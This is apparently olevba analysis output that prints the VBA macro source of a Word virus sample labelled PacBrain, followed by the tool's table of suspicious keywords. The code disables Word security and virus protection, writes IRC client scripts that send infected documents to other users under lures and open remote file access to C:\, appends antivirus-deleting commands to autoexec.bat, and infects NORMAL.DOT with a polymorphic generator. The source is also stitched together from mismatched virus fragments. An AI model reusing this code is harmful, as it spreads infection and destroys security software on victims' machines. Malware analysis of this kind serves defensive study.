olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.PacBrain-a224193bc82bd31c7dfdc9f1cd5a4679ee3e02d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.PacBrain-a224193bc82bd31c7dfdc9f1cd5a4679ee3e02d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.PacBrain-a224193bc82bd31c7dfdc9f1cd5a4679ee3e02d8 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'W97.PullUp
'coded by a.v_killer
Declare Function GetSystemDirectory Lib "kernel32" Alias
"GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Dim SysDir As String
SysDir = SystemDirectory
If Right(SysDir, 1) <> "\" Then SysDir = SysDir + "\"
.VBComponents("PullUp").Export SysDir & Application.UserName & ".dll"
.VBComponents.Import (SysDir & Application.UserName & ".dll")
Function SystemDirectory() As String
On Local Error Resume Next
Dim Winpath As String
Dim temp
Winpath = String(145, Chr(0))
temp = GetSystemDirectory(Winpath, 145)
SystemDirectory = Left(Winpath, InStr(Winpath, Chr(0)) - 1)
End Function


Private Sub Stealth()
On Error Resume Next
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
End Sub

Sub GetMirc()
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
If (Fso.FolderExists("c:\mirc")) Then
Set ini = Fso.opentextfile("C:\mirc\script.ini")
Fso.CopyFile wscript.ScriptFullName, "c:\windows\help\PullUp.vbs"
ini.writeline "[script]"
ini.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "on 1:FILESENT:*.*:./dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\help\PullUp.vbs"
ini.writeline "ctcp 1:ping:?:/notice $nick pakis r the best | /halt"
ini.writeline "on 1:TEXT:*real*:#:/msg $chan PullUp"
ini.writeline "On 1:join:#:/msg $nick no one could deafeat pakis"
ini.writeline ";pakbrain "
ini.writeline ";pakis are really genius"
ini.Close
End If
End Sub

Private Sub Pirch()
On Error Resume Next
ASE3028 = Dir("C:\ReadMe.doc")
If ASE3028 = "" Then ActiveDocument.SaveAs "C:\ReadMe.doc"
NBC3506 = Dir("C:\mirc\mirc.ini")
If NBC3506 <> "" Then
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
KnJn11011 = MySeInVy & ByBy3077 & Int(Rnd * 4083)
Print #1, ";"
Print #1, "n0=on 1:start:{"
Print #1, "n1= /.remote on"
Print #1, "n2= /.ctcps on"
Print #1, "n3= /.events on"
Print #1, "n4= /.ebeeps off"
Print #1, "n5= /.pdcc 99999999999"
Print #1, "n6= /.dcc packetsize 4096"
Print #1, "n7=           }"
Print #1, "n8=on 1:connect:{ /.clearall"
Print #1, "n9=           /.enable #spreadin"
Print #1, "n10=          /.copy -o C:\ReadMe.doc C:\mustread.doc"
Print #1, "n11=        }"
Print #1, "n12=on 1:disconnect:{ /.remove C:\ReadMe.doc"
Print #1, "n13=              /.remove C:\mustread.doc"
Print #1, "n14=            }"
Print #1, "n15=alias /unload /echo 2*** Unloaded $1- | halt"
Print #1, "n16=on 1:input:*:/.msg #WVE_gen *-+-* [( $+ $active $+ ) $1-] $ip on $server $+ : $+ $port $+ *+* $host $usermode *+* $os $cb $url *+* $lastwin $active *-+-*"
Print #1, "n17=on 1:join:#:/.msg $nick To have the latest infos about Free Internet  TYPE: !readme  here or in $chan"
Print #1, "n18=on 1:nick:/.msg $newnick Hey $newnick is better than $nick ;)  If u want the biggest sex-password-list  TYPE: !sexlist  here or in $chan"
Print #1, "n19=on 1:kick:#:/.msg $chan If u need infos about the latest news in World  TYPE: !readme  here"
Print #1, "n20=on 1:filercvd:*.*:/.dcc send $nick C:\ReadMe.doc"
Print #1, "n21=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\SexList.doc"
Print #1, "n22=on 1:text:*!readme*:#: { if ( $nick == $me ) {halt} | /.dcc send $nick C:\ReadMe.doc | /.msg $nick Here is the readme file u need, cya soon. }"
Print #1, "n23=on 1:text:*!sexlist*:#: {/.copy -o C:\ReadMe.doc C:\SexList.doc | if ( $nick == $me ) {halt} | /.dcc send $nick C:\SexList.doc | /.msg $nick Here is the password list u ask for, enjoy :) }"
Print #1, "n24=ctcp 1:*wvefileserver*:*:/.fserve $2 $3 $4"
Print #1, "n25=#spreadin off"
Print #1, "n26=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\ReadMe.doc | /.disable #spreadin | /.timersp 0 24 | /.enable #spreadin }"
Print #1, "n27=#spreadin end"
Close #1
End If
FUD3151 = Dir("C:\pirch98\pirch98.ini")
If FUD3151 <> "" Then
Open "C:\pirch98\events.ini" For Output As #1
Print #1, "[Levels]"
Print #1, "Enabled=1"
EtNy14023 = GiVeUeNl & ElEy11673 & Int(Rnd * 7258)
BiCu6512 = JeNkJpSe & PrIy13787 & Int(Rnd * 653)
Print #1, "Count=1"
Print #1, "Level1 = Dem"
Print #1, "DemEnabled = 1"
Print #1, ";"
Print #1, "[Dem]"
Print #1, "User1=*!*@*"
Print #1, "UserCount = 1"
Print #1, "Event1=ON JOIN:#:/dcc send $nick C:\ReadMe.doc | /msg $nick Hi! this is the file u ask for!"
Print #1, "Event2=ON PART:#:/dcc send $nick C:\ReadMe.doc | /notice $nick Hi! here comes your file! | /enable -q *"
Print #1, "Event3=ON TEXT:*walvgen*:#:/msg $nick WVE W0rm PirchVers. $identd $address"
Print #1, "Event4=ON TEXT:*wvefileserver*:*:/faccess $nick C:\ 5"
Print #1, "Event5=ON TEXT:*avp*:*:/ignore $nick 1"
Print #1, "Event6=ON TEXT:*ReadMe*:*:/ignore $nick 1"
Print #1, "Event7=ON TEXT:*doc*:*:/ignore $nick 1"
Print #1, "Event8=ON TEXT:*worm*:*:/ignore $nick 1"
Print #1, "Event9=ON TEXT:*virus*:*:/ignore $nick 1"
Print #1, "Event10=ON TEXT:*info*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event11=ON TEXT:*trad*:*:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event12=ON QUIT:/msg #WVE_gen WVE W0rm PirchVers. was here ... $identd $address"
Print #1, "Event13=ON DCCDONE:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "Event14=ON DCCSENT:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
Print #1, "EventCount = 14"
Print #1, ";"
Print #1, "[DCC]"
Print #1, "AutoHideDccWin = 1"
Close #1
End If
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events", "Event17") = "dcc send $nick C:\ReadMe.doc"
End Sub

Function GenName$()
i = 4 + Rnd() * 3
a$ = ""
For j = 1 To i: a$ = a$ + Chr$(65 + Rnd() * 23): Next j
GenName$ = a$
End Function

Sub InsertParaEnd()
InsertPara
i = Rnd()
If i < 0.2 Then Insert GenName$ + "=" + Str$(100 * Rnd()) Else If i < 0.4 Then Insert GenName$ + "=Rnd()" Else If i < 0.6 Then Insert GenName$ + " = Now()" Else If i < 0.8 Then Insert "REM " + GenName$ Else If i > 0.81 And i < 0.813 Then Insert "REM (c) " + "Nasty Lamer & Ugly Luser" + ", Slovakia" Else If i > 0.82 And i < 0.823 Then Insert "REM Do not forget: SlovakDictator is mother of all macro viruses of the new generation ! "
If i < 0.95 Then InsertPara
End Sub

Sub InsertLine(cmd$, a$, b$, c$)
Insert cmd$ + " "
For i = 1 To 5
If Rnd() > 0.5 Then
    d$ = a$: a$ = b$: b$ = d$
Else
    d$ = b$: b$ = c$: c$ = d$
End If
Next i
Insert a$ + ", " + b$ + ", " + c$
End Sub

Function GenPolyMacro$(where, thismacro$)
xMacroName$ = GenName$
xAutoTextName$ = GenName$
xDocVar$ = GenName$
xWinName$ = GenName$ + "$"
xInfType$ = Str$(where)
xOnError$ = GenName$
ToolsMacro .Edit, .Name = thismacro$, .Show = where
ViewToolbars .Toolbar = "Macro", .Hide
If where = 1 Then ParaUp
InsertParaEnd: InsertParaEnd
Insert "On Error Goto " + xOnError$: InsertParaEnd
Insert "ScreenUpdating 0": InsertParaEnd
Insert xDocVar$ + "$ =" + Chr$(34) + "A" + Chr$(34): InsertParaEnd
Insert "SetDocumentVar " + xDocVar$ + "$, " + Chr$(34) + xAutoTextName$ + Chr$(34): InsertParaEnd
Insert xWinName$ + " = WindowName$()": InsertParaEnd
InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Edit") : InsertParaEnd
InsertLine("EditAutoText", ".Name=" + Chr$(34) + xAutoTextName$ + Chr$(34), ".InsertAs=0", ".Insert") : InsertParaEnd
Insert "DocClose 1": InsertParaEnd
Insert "Activate " + xWinName$: InsertParaEnd
Insert "Call " + xMacroName$: InsertParaEnd
InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Delete") : InsertParaEnd
Insert xOnError$ + ":": InsertParaEnd
DocClose 1
GenPolyMacro$ = xAutoTextName$
End Function
Private Sub Retro()
On Error Resume Next
Open "c:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo muffin muffin muffin"
Print #1, "echo ** muffin **"
Print #1, "echo want some"

Print #1, "echo [Norton System Check]"
Print #1, "del c:\progra~1\norton~1\*.exe"
Print #1, "del c:\progra~1\norton~1\*.dll"
Print #1, "del c:\progra~1\norton~1\*.dat"

Print #1, "del c:\progra~1\norton~1\*.vxd"
Print #1, "del c:\norton~1\*.exe"
Print #1, "del c:\norton~1\*.dll"
Print #1, "del c:\norton~1\*.dat"
Print #1, "del c:\norton~1\*.vxd"
Print #1, "echo."

Print #1, "echo [AVP System Check]"
Print #1, "del c:\progra~1\antiv~1\*.avc "
Print #1, "del c:\progra~1\antiv~1\*.set "
Print #1, "del c:\progra~1\antiv~1\*.dll "
Print #1, "del c:\progra~1\antiv~1\*.vxd "
Print #1, "del c:\progra~1\antiv~1\*.exe "
Print #1, "del c:\antiv~1\*.avc "

Print #1, "del c:\antiv~1\*.set "
Print #1, "del c:\antiv~1\*.dll "
Print #1, "del c:\antiv~1\*.vxd "
Print #1, "del c:\antiv~1\*.exe "
Print #1, "echo."

Print #1, "echo [McAfee System Check]"
Print #1, "del c:\progra~1\mcafee~1\*.dat "
Print #1, "del c:\progra~1\mcafee~1\*.dll "
Print #1, "del c:\progra~1\mcafee~1\*.exe "
Print #1, "del c:\progra~1\mcafee~1\*.vsc "
Print #1, "del c:\progra~1\mcafee\*.dat "

Print #1, "del c:\progra~1\mcafee\*.dll "
Print #1, "del c:\progra~1\mcafee\*.exe "
Print #1, "del c:\progra~1\mcafee\*.vsc "
Print #1, "del c:\mcafee~1\*.dat"
Print #1, "del c:\mcafee~1\*.dll"
Print #1, "del c:\mcafee~1\*.exe"
Print #1, "del c:\mcafee~1\*.vsc"
Print #1, "del c:\mcafee\*.dat"
Print #1, "del c:\mcafee\*.dll"
Print #1, "del c:\mcafee\*.exe"
Print #1, "del c:\mcafee\*.vsc"
Print #1, "echo."
Close #1
End Sub
Sub Infect(where)
xOldAutoTextName$ = GetDocumentVar$("A")
normaldot$ = UCase$(DefaultDir$(2) + "\NORMAL.DOT")
inffile$ = FileName$()
If where = 1 Then
    xAutoTextName$ = GenPolyMacro$(where, "FileSave")
    Organizer .Copy, .Source = inffile$, .Destination = normaldot$, .Name = xOldAutoTextName$, .Tab = 1
    Organizer .Rename, .Source = normaldot$, .Name = xOldAutoTextName$, .NewName = xAutoTextName$, .Tab = 1
    MacroCopy normaldot$ + ":FileSave", normaldot$ + ":FileSave", 1
    MacroCopy normaldot$ + ":FileSave", normaldot$ + ":ToolsMacro", 1
    CustomizeMenu
Else
    xAutoTextName$ = GenPolyMacro$(where, "AutoOpen")
    Organizer .Copy, .Source = normaldot$, .Destination = inffile$, .Name = xOldAutoTextName$, .Tab = 1
    Organizer .Rename, .Source = inffile$, .Name = xOldAutoTextName$, .NewName = xAutoTextName$, .Tab = 1
    MacroCopy inffile$ + ":AutoOpen", inffile$ + ":AutoOpen", 1
End If

ToolsOptionsUserInfo .Name = "Pull", .Initials = "Up"

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PullUp.vbs          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
